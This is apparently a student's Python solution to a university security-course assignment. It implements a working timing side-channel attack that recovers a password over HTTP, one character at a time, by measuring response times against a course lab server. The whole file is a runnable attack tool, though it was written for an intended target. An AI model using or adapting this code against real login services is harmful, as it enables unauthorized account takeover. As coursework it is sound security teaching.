"""
    Assignment 1.2 on Attacks On Implementations [CS - 3682] @ Runi
    Timing-based password attack implementation using HTTP response timing differences.    
"""

from abc import ABC, abstractmethod
from collections import defaultdict
from dataclasses import dataclass
import math
import statistics
from typing import Dict, Any, List, Tuple

import asyncio
import aiohttp

import string
import time

# ==========================
# Auxilliary
# ==========================
class Logger:
    def __init__(self, enabled: bool = True):
        self.enabled = enabled

    def log(self, msg: str = ""):
        if self.enabled:
            print(msg)


logger = Logger(enabled=True)

class MeasuresCollector:
    def __init__(self):
        # posision -> char -> measurements
        self.measurements: Dict[int, Dict[str, List[int]]] = defaultdict(
            lambda: defaultdict(list)
        )

    def add(self, position: int, char: str, new_measurements: List[int]):
            self.measurements[position][char].extend(new_measurements)
    
    def clear(self):
        self.measurements.clear()
    
    def get(self, position: int, char: str) -> List[int]:
        return self.measurements.get(position, {}).get(char, [])
    
    def get_all(self) -> Dict[int, Dict[str, List[int]]]:
        return {
            pos: dict(chars)
            for pos, chars in self.measurements.items()
        }
    
    def get_subset(self, position: int, chars: List[str]) -> Dict[str, List[int]]:
        if position not in self.measurements:
            return {}

        return {
            char: self.measurements[position][char]
            for char in chars
            if char in self.measurements[position]
        }

def robust_median(
    samples: List[int],
    min_samples_for_filtering: int = 5,
    mad_threshold: float = 3.5
) -> float:
    if not samples:
        raise ValueError("No samples provided")

    if len(samples) < min_samples_for_filtering:
        return statistics.median(samples)

    median = statistics.median(samples)

    deviations = [abs(x - median) for x in samples]
    mad = statistics.median(deviations)

    if mad == 0:
        return median

    filtered = [
        x for x in samples
        if abs(x - median) / mad <= mad_threshold
    ]

    if len(filtered) < min_samples_for_filtering // 2:
        return median

    return statistics.median(filtered) 

# ==========================
# Victim Server Configuration
# ==========================
@dataclass
class VictimServer:
    """Configuration container for the target server."""
    def __init__(
        self,
        url: str = "http://127.0.0.1/",
        alphabet: List[str] = list(string.ascii_lowercase),
        max_pwd_len: int = 32,
        difficulty: int = 1
    ):
        """Initialize victim server details.

        Args:
            url: Base URL of the server.
            alphabet: Characters to try during brute-force.
            max_pwd_len: Maximum expected password length.
        """
        self.url = url
        self.alphabet = alphabet
        self.max_pwd_len = max_pwd_len
        self.difficulty = difficulty


# ==========================
# Decision Engine
# ==========================
class DecisionEngine(ABC):
    """Abstract base class for timing-based decision logic."""
    @abstractmethod
    def decide(self, candidates: Dict[str, List[int]]) -> str: ...
    """Choose the most likely character from timing samples."""
    @abstractmethod
    def decide_top_k(self, candidates: Dict[str, List[int]], top_k: int) -> List[Tuple[str, float]]: ...
    """Return top-k candidates ranked by timing difference."""


# ==========================
# Request Sender
# ==========================
class RequestSender(ABC):
    """Abstract interface for sending requests to the victim server."""
    @abstractmethod
    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]: ...
    @abstractmethod
    async def close_sessions(self) -> None: ...


class AsyncHTTPSender(RequestSender):
    """HTTP-based request sender with connection pooling and warmup."""
    def __init__(
        self,
        url: str,
        base_payload: Dict[str, Any],
        timeout_sec: float = 5.0,
        pool_size: int = 100
    ):
        self.url = url.rstrip("/") + "/"
        self.fixed_payload = base_payload.copy()
        self.pool_size = pool_size
        self.session = None
        self.timeout_sec = timeout_sec

    async def _setup_session(self) -> None:
        """Create and configure a requests Session with connection pooling."""
        timeout = aiohttp.ClientTimeout(total=self.timeout_sec)
        connector = aiohttp.TCPConnector(limit=self.pool_size, ssl=False) 
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)


    async def _do_initial_warmup(self) -> None:
        """Perform a few dummy requests to warm up connection pool"""
        tasks = []
        for i in range(3):
            payload = {"password": f"warm{i}"}
            tasks.append(self.session.get(self.url, params=payload))
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except:
            pass
            

    async def init(self):
        await self._setup_session()
        await self._do_initial_warmup()


    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]:
        """Send a single request with combined fixed + variable payload.

        Args:
            payload: Dynamic part of the query parameters.

        Returns:
            Tuple containing stripped response text and elapsed time in microseconds.
            On error returns ("", 0).
        """
        request = self.fixed_payload.copy()
        request.update(payload)

        try:
            start_ns = time.perf_counter_ns()
            
            async with self.session.get(url=self.url, params=request) as response:
                body_txt = (await response.text()).strip()
            elapsed_us = (time.perf_counter_ns() - start_ns) // 1000

            return body_txt, int(elapsed_us)
            
        except Exception:
            return "", 0

    async def close_sessions(self):
        if self.session:
            await self.session.close()
            self.session = None

# ==========================
# Sampler
# ==========================
class AsyncSampler:
    """Utility to collect multiple timing samples for a given payload."""
    def __init__(self, sender: RequestSender):
        """Initialize sampler with a request sender.
        Args:    
            sender: Object responsible for sending HTTP requests.
        """
        self.sender = sender

    async def run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
        """Run multiple requests and collect timing data concurrently.
        """
        if isinstance(self.sender, AsyncHTTPSender) and self.sender.session is None:
            await self.sender.init()

        tasks = [self.sender.send(payload) for _ in range(n_samples)]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        bodies = [body for body, _ in results]
        times = [elapsed_time for _, elapsed_time in results if elapsed_time > 0]
        
        return bodies[-1], times


class MedianDecisionEngine(DecisionEngine):
    """Decision engine using robust median timing."""

    def __init__(
        self,
        min_samples: int = 2,
        min_samples_for_filtering: int = 5,
        mad_threshold: float = 3.5,
    ):
        self.min_samples = min_samples
        self.min_samples_for_filtering = min_samples_for_filtering
        self.mad_threshold = mad_threshold

    def decide(self, candidates: Dict[str, List[int]]) -> str:
        top = self.decide_top_k(candidates, top_k=1)
        return top[0][0] if top else ""

    def decide_top_k(
        self, candidates: Dict[str, List[int]], top_k: int = 3
    ) -> List[Tuple[str, float]]:

        if not candidates:
            return []

        medians: Dict[str, float] = {}

        for char, times in candidates.items():
            if len(times) < self.min_samples:
                continue

            medians[char] = robust_median(
                times,
                min_samples_for_filtering=self.min_samples_for_filtering,
                mad_threshold=self.mad_threshold,
            )

        if not medians:
            return []

        baseline = min(medians.values())
        scores = [(c, t - baseline) for c, t in medians.items()]
        scores.sort(key=lambda x: x[1], reverse=True)

        return scores[:top_k]
    
# ==========================
# TimingAttacker - main logic
# ==========================
class TimingAttacker:
    """Orchestrates the full timing attack."""
    def __init__(
        self,
        victim_server: VictimServer,
        sender: AsyncSampler,
        base_payload: Dict[str, Any],
        decision_engine: DecisionEngine,
        padding: str = "@"
    ):
        """Initialize the attacker.

        Args:
            victim_server: Configuration of the target.
            sender: HTTP request sender instance.
            base_payload: Fixed query parameters (user, difficulty, etc.).
            decision_engine: Engine to interpret timing data.
            padding: Character used to pad incorrect password attempts.
        """
        self.victim = victim_server
        self.sender = sender
        self.sampler = AsyncSampler(sender)
        self.base_payload = base_payload
        self.decision_engine = decision_engine
        self.padding = padding
        self.measures_memory: MeasuresCollector = MeasuresCollector()

    async def detect_password_length(self, samples_for_pwd_len: int = 5) -> int:
        """Detect password length by observing timing differences for padded passwords.

        Returns:
            Detected password length (as integer string from server logic).
        """
        samples_for_len: Dict[int, List[int]] = {}
        
        for length in range(1, self.victim.max_pwd_len + 1):
            payload = {"password": self.padding * length}
            _, samples = await self.sampler.run_sample(payload, n_samples=samples_for_pwd_len)
            samples_for_len[length] = samples

        best_len = self.decision_engine.decide(samples_for_len)
        return best_len

    async def _measure_candidates(
        self,
        candidates: List[str],
        posision: int, 
        prefix: str,
        suffix: str,
        new_samples_per_candidate: int
    ) -> Dict[str, List[int]]:
        """Measure timing for each candidate character at current position.

        Args:
            candidates: List of characters to test.
            prefix: Already recovered password prefix.
            suffix: Padding or known suffix.
            samples_per_candidate: How many samples per character.

        Returns:
            Mapping of character -> list of timing samples.
        """
        
        async def get_samples_for_char(char: str) -> Tuple[str, List[int]]:
            payload = {"password": prefix + char + suffix}
            _, samples = await self.sampler.run_sample(payload, n_samples=new_samples_per_candidate)
            return char, samples
        
        tasks = [get_samples_for_char(char) for char in candidates]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        for char, samples in results:
            self.measures_memory.add(posision, char, samples)

        measures = self.measures_memory.get_subset(posision, candidates)

        return measures

    def _calc_gap(self, samples: Dict[str, List[int]]) -> Tuple[float, str]:
        """Calculate the timing gap between best and second-best candidate.

        Returns:
            Tuple of (gap_in_us, best_character).
        """
        medians = {char: robust_median(char_measures) for char, char_measures in samples.items() if char_measures}

        if not medians:
            return 0, "a"
        
        sorted_med = sorted(medians.items(), key=lambda x: x[1], reverse=True)
        best_char, best_time = sorted_med[0]
        second_time = sorted_med[1][1] if len(sorted_med) > 1 else best_time

        return best_time - second_time, best_char

    async def _attack_position(
        self,
        posision: int,
        prefix: str,
        suffix: str,
        top_k: int,
        max_rounds: int,
        sample_increment: int,
        max_samples: int,
        initial_samples: int,
        min_gap_ms: int,
        min_gap_confidence: float
    ) -> str:
        """Attack a single non-final position using adaptive sampling.

        Returns:
            The recovered character
        """
        candidates = list(self.victim.alphabet)
        samples_per_candidate = initial_samples
        round_number = 0

        candidates_samples: Dict[str, List[int]] = {}

        while len(candidates) > 1 and round_number < max_rounds:
            round_number += 1
            
            logger.log(f"       round num {round_number} | candidates: {candidates} | samples_p_candidates: {samples_per_candidate}")
            
            candidates_samples = await self._measure_candidates(
                candidates, posision, prefix, suffix, samples_per_candidate
            )

            gap, best_char = self._calc_gap(candidates_samples)
            gap_confidence = gap_confidence_score(gap_us=gap, 
                                                  difficulty=self.victim.difficulty, 
                                                  samples_per_candidate=len(self.measures_memory.get(posision, best_char)))
            logger.log(f"       best_char '{best_char}' | gap {gap}")

            if gap >= min_gap_ms and gap_confidence >= min_gap_confidence:
                return best_char

            # Reduce candidate set to top-k and increse sampling
            best_k = self.decision_engine.decide_top_k(candidates_samples, top_k=top_k)
            candidates = [c for c, _ in best_k]
            samples_per_candidate = min(samples_per_candidate + sample_increment, max_samples)

        return self.decision_engine.decide(candidates_samples)


    async def _attack_last_position(self, prefix: str) -> Tuple[str, str]:
        """Brute-force the final character by checking for success response.

        Args:
            prefix: Recovered password so far (missing last char).

        Returns:
            Complete password.
            Status as str. "1" success "0" failure
        """
        async def get_resbody_for_char(char: str) -> Tuple[str, str]:
            payload = {"password": prefix + char}
            body_txt, _ = await self.sampler.run_sample(payload, n_samples=1)
            return char, body_txt
        
        tasks = [get_resbody_for_char(char) for char in self.victim.alphabet]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        for char, body_txt in results:
            if body_txt == "1":
                return prefix + char, body_txt

        return prefix, body_txt
    

    async def attack(
        self,
        password_len: int,
        top_k: int = 3,
        max_rounds: int = 3,
        sample_increment: int = 2,
        max_samples: int = 10,
        initial_samples: int = 3,
        min_gap_ms: int = 200, 
        min_gap_confidence = 0.95
    ) -> Tuple[str, str]:
        """Perform the complete timing attack.

        Args:S
            password_len: Length of the password (as detected or known).
            top_k: Number of candidates to keep between rounds.
            max_rounds: Maximum refinement rounds per position.
            sample_increment: How many more samples to take each failed round.
            max_samples: Upper bound on samples per candidate.
            initial_samples: Starting number of samples per candidate.
            min_gap_ms: Minimum timing gap to trust a decision (microseconds).

        Returns: Tuple[str, str]
            Recovered password as string.
            Attack Status code as string. ("1" for succuess "0" for failure).
        """
        password = ""
        for pos in range(password_len):
            if pos == password_len - 1:
                password, status = await self._attack_last_position(prefix=password)
                break
            
            suffix = self.padding * (password_len - len(password) - 1)
            logger.log(f"    Attack position {pos} | prefix: {password} suffix: {suffix}")

            next_char = await self._attack_position(
                posision=pos,
                prefix=password,
                suffix=suffix,
                top_k=top_k,
                max_rounds=max_rounds,
                sample_increment=sample_increment,
                max_samples=max_samples,
                initial_samples=initial_samples,
                min_gap_ms=min_gap_ms, 
                min_gap_confidence=min_gap_confidence
            )
            password += next_char

        return password, status
    
    async def close(self, clear_measures: bool = False):
        if clear_measures and self.measures_memory:
            self.measures_memory.clear()
        
        if self.sampler.sender:
            await self.sampler.sender.close_sessions()
    

# ==========================
# Main
# ==========================
# def calibrate_attack_params(difficulty: int = 1) -> Dict[str, int]:
#     attack_params = {
#         "initial_samples": 3, #max(2, difficulty) if difficulty <= 5 else difficulty * 2,
#         "sample_increment": 2 if difficulty <= 4 else difficulty,
#         "max_samples": max(10, difficulty * 5),
#         "min_gap_ms": 200, # max(1000, 100000 // difficulty),
#         "top_k": 3 if difficulty <= 3 else 5,
#         "max_rounds": 3 if difficulty <= 2 else 5
#     }
#     return attack_params

def compute_min_gap_us_adaptive(
    difficulty: int,
    samples_per_candidate: int,
    confidence_sigma: float = 3.0,
    base_stall_ms: float = 250.0,
) -> int:
    """
    Compute an adaptive minimum timing gap (in microseconds) that depends
    on both difficulty and number of samples.

    More samples => lower required gap.
    """

    mean_gap_ms = base_stall_ms / difficulty

    # Noise of difference between two medians
    noise_std_ms = math.sqrt(2) * difficulty / math.sqrt(samples_per_candidate)

    min_gap_ms = mean_gap_ms - confidence_sigma * noise_std_ms

    return max(0, int(min_gap_ms * 1000))

def gap_confidence_score(
    gap_us: float,
    difficulty: int,
    samples_per_candidate: int,
) -> float:
    """
    Returns a confidence score in [0, 1] indicating how likely the
    leading candidate is truly better.
    """

    noise_std_ms = math.sqrt(2) * difficulty / math.sqrt(samples_per_candidate)
    noise_std_us = noise_std_ms * 1000

    if noise_std_us == 0:
        return 1.0

    z = gap_us / noise_std_us

    # map z-score to [0,1] confidence (soft, monotonic)
    return max(0.0, min(1.0, z / 3.0))

async def commit_full_attack(username: str, victim: VictimServer, difficulty: int = 1, retries_on_fail: int = 3):
    base_payload = {"user": username, "difficulty": difficulty}
    
    async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
    median_decision_engine = MedianDecisionEngine(min_samples=max(2, difficulty))
    attacker = TimingAttacker(
        victim_server=victim,
        sender=async_http_sender,
        base_payload=base_payload,
        decision_engine=median_decision_engine
    )
    # attack_params = calibrate_attack_params(difficulty=difficulty)

    for attempt in range(1, retries_on_fail + 1):
        logger.log(f"Difficulty ({difficulty}) attempt {attempt}")
        try:
            password_length = await attacker.detect_password_length(
                samples_for_pwd_len=max(4, difficulty)
            ) # TODO: pass the parameter like humen.. its barbaric
            logger.log(f"    password length = {password_length}")
            password, attack_status = await attacker.attack(password_len=password_length) # TODO: Calibrate attack params adaptive to difficulty
            logger.log(f"    attack status: {attack_status} || password detected = {password}")
            
            if attack_status == "1":
                return password
        
        except Exception as e:
            logger.log(f"Error: attempt {attempt} failed: {e}")

        finally:
            await attacker.close(clear_measures=attack_status == "1") # clear measures memory if attack succeed
            await asyncio.sleep(0.1)


async def main():
    BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
    USERNAME = "315388850"
    MAX_DIFFICULTY = 10

    victim = VictimServer(url=BASE_URL)

    total_start_ns = time.perf_counter()
    for difficulty in [1]: #range(1, MAX_DIFFICULTY + 1):
        victim = VictimServer(url=BASE_URL, difficulty=difficulty)
        start_ns = time.perf_counter()
        password = await commit_full_attack(username=USERNAME, victim=victim, difficulty=difficulty)
        print(f"    [{time.ctime()}] | level_time: {(time.perf_counter() - start_ns) / 60} difficulty ({difficulty}) | password: {password}")

    print(f"MAX DIFFICULTY = {MAX_DIFFICULTY} || TOTAL TIME: {(time.perf_counter() - total_start_ns) / 60}")

if __name__ == "__main__":
    asyncio.run(main())